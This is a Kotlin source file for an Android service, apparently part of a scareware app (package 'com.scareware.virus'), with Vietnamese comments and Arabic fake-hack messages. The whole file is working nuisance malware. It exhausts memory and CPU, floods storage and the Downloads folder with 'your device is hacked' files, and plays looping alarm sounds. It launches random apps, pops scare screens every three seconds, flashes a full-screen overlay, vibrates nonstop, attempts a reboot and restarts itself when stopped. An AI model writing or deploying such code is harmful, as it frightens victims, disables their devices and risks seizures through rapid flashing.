package com.scareware.virus

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentValues
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.MediaStore
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import androidx.core.app.NotificationCompat
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class LagService : Service() {

    private val running = AtomicBoolean(true)
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newCachedThreadPool()
    private val ramChunks = mutableListOf<ByteArray>()
    private var windowManager: WindowManager? = null
    private var flashView: View? = null
    private var mediaPlayer: MediaPlayer? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(99, buildNotification())
        startHorrorSound()          // phát âm thanh khi đã thoát app
        startRamAttack()
        startJunkArabicFlood()      // file rác trong + ngoài
        startInfiniteAppOpen()
        startScarePopupEvery3s()
        startScreenFlash()
        startVibrateLoop()
        handler.postDelayed({ tryReboot() }, 30000)
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val id = "sys"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(id, "System", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, id)
            .setContentTitle("فيروس النظام")
            .setContentText("...")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    /** Âm thanh kinh dị chạy trong service → vẫn phát khi đã thoát app */
    private fun startHorrorSound() {
        if (mediaPlayer != null) return
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.setVolume(1f, 1f)
            mediaPlayer?.setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build()
            )
            mediaPlayer?.start()
        } catch (_: Exception) {
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(this@LagService, uri)
                    setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }
    }

    private fun startRamAttack() {
        executor.execute {
            while (running.get()) {
                try {
                    val chunk = ByteArray(12 * 1024 * 1024)
                    for (i in chunk.indices step 4096) chunk[i] = 1
                    synchronized(ramChunks) {
                        ramChunks.add(chunk)
                        if (ramChunks.size > 50) ramChunks.removeAt(0)
                    }
                } catch (_: OutOfMemoryError) {
                    Thread.sleep(1000)
                }
                Thread.sleep(200)
            }
        }
        repeat(4) {
            executor.execute {
                var x = 0L
                while (running.get()) x = (x * 31 + 17) xor System.nanoTime()
            }
        }
    }

    /** File rác Ả Rập: trong app + cố ghi ra Downloads (thấy được ngoài Files) */
    private fun startJunkArabicFlood() {
        val arabicNames = listOf(
            "فيروس", "اختراق", "بيانات_مسروقة", "تدمير_النظام",
            "خطر", "سرقة", "رمز_فيروس", "تحذير", "نظام_مخترق"
        )
        val body = "⚠ تم اختراق جهازك ⚠\nفيروس النظام نشط\nبياناتك تم سرقتها\n".repeat(30)

        executor.execute {
            var n = 0
            while (running.get() && n < 800) {
                try {
                    // 1) Trong bộ nhớ app (luôn được)
                    val dir = File(filesDir, "ملفات_فيروس")
                    if (!dir.exists()) dir.mkdirs()
                    val name = arabicNames[Random.nextInt(arabicNames.size)] + "_${n}_" + System.currentTimeMillis() + ".txt"
                    File(dir, name).writeText(body)

                    // 2) Thử ghi ra Downloads (thấy trong File Manager)
                    tryWritePublicDownload(arabicNames[Random.nextInt(arabicNames.size)] + "_$n.txt", body)

                    // 3) Thử đường dẫn legacy
                    try {
                        val dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                        if (dl != null) {
                            if (!dl.exists()) dl.mkdirs()
                            File(dl, "فيروس_${n}_${System.currentTimeMillis()}.txt").writeText(body)
                        }
                    } catch (_: Exception) {}

                    n++
                    Thread.sleep(40) // siêu nhanh
                } catch (_: Exception) {
                    Thread.sleep(200)
                }
            }
        }
    }

    private fun tryWritePublicDownload(fileName: String, content: String) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, "text/plain")
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val uri = contentResolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values)
                if (uri != null) {
                    contentResolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                    values.clear()
                    values.put(MediaStore.Downloads.IS_PENDING, 0)
                    contentResolver.update(uri, values, null, null)
                }
            }
        } catch (_: Exception) {}
    }

    private fun startInfiniteAppOpen() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!running.get()) return
                tryOpenRandomApp()
                handler.postDelayed(this, Random.nextLong(1500, 3500))
            }
        }, 2000)
    }

    private fun tryOpenRandomApp() {
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter { (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 && it.packageName != packageName }
            if (apps.isEmpty()) return
            val target = apps[Random.nextInt(apps.size)]
            val launch = pm.getLaunchIntentForPackage(target.packageName) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(launch)
        } catch (_: Exception) {}
    }

    private fun startScarePopupEvery3s() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!running.get()) return
                try {
                    val i = Intent(this@LagService, ScarePopupActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    startActivity(i)
                } catch (_: Exception) {}
                handler.postDelayed(this, 3000)
            }
        }, 3000)
    }

    private fun startScreenFlash() {
        try {
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.TOP or Gravity.START
            flashView = FrameLayout(this).apply { setBackgroundColor(Color.RED); alpha = 0f }
            windowManager?.addView(flashView, params)
            val colors = intArrayOf(Color.BLACK, Color.RED, Color.WHITE, Color.YELLOW)
            handler.post(object : Runnable {
                override fun run() {
                    flashView?.let {
                        it.setBackgroundColor(colors[Random.nextInt(colors.size)])
                        it.alpha = if (Random.nextBoolean()) 0.85f else 0.15f
                    }
                    handler.postDelayed(this, Random.nextLong(50, 180))
                }
            })
        } catch (_: Exception) {}
    }

    private fun startVibrateLoop() {
        handler.post(object : Runnable {
            override fun run() {
                if (!running.get()) return
                try {
                    val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(350, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        v.vibrate(350)
                    }
                } catch (_: Exception) {}
                handler.postDelayed(this, 1400)
            }
        })
    }

    private fun tryReboot() {
        try {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            pm.reboot(null)
        } catch (_: Exception) {
            try { Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot")) } catch (_: Exception) {}
        }
    }

    override fun onDestroy() {
        running.set(false)
        try { mediaPlayer?.stop(); mediaPlayer?.release() } catch (_: Exception) {}
        mediaPlayer = null
        try { flashView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}
        val restart = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart)
        else startService(restart)
        super.onDestroy()
    }
}
